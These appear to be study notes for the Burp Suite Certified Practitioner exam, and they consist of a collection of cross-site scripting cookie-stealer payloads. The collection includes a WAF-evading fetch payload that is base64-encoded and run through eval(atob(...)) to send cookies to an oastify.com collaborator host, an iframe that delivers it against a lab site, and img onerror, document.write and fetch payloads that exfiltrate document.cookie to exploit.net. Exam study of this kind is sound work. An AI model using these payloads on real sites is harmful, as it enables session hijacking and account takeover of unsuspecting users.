
# Burp-Suite-Certified-Practitioner-Exam-Study
Burp Suite Certified Practitioner Exam Study Notes

## Cross Site Scripting

### Cookie Stealers

#### Reflected XSS in Search
Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
<sub>WAF is preventing dangerous search filters and tags!</sub>
```JavaScript
fetch("https://839cktu7uogedm6a1kjuy3outlzcn2br.oastify.com/?c=" + btoa(document['cookie']))
```
<sup>Base64 encode the payload</sup>
```
ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk=
```
<sub>Test payload on our own session in Search</sub>
```JavaScript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```
![This image show after entering the above into search and the collaborator receiving request with base64 cookie value from us.](xss1.png)
<sup>hosting in iframe on exploit server</sup>
```html
<iframe src="https://0ab400ae04775498c08e0b8b00ef00bd.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%5a%58%68%77%62%47%39%70%64%43%30%77%59%54%6b%34%4d%44%42%68%5a%6a%41%30%4d%6a%67%31%4e%47%49%77%59%7a%41%77%59%54%41%34%4d%47%59%77%4d%57%46%69%4d%44%41%79%5a%43%35%6c%65%48%42%73%62%32%6c%30%4c%58%4e%6c%63%6e%5a%6c%63%69%35%75%5a%58%51%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
```
URL and Base64 online encoders and decoders
[URL Decode and Encode](https://www.urldecoder.org/)
[BASE64 Decode and Encode](https://www.base64encode.org/)  

Blog post comment section
```html
<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
```  

Product and Store lookup
```html
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
```  

Stored XSS Blog post
```JavaScript
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```  

Fetch API Cookie Stealer
```JavaScript
<script>
fetch('https://exploit.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
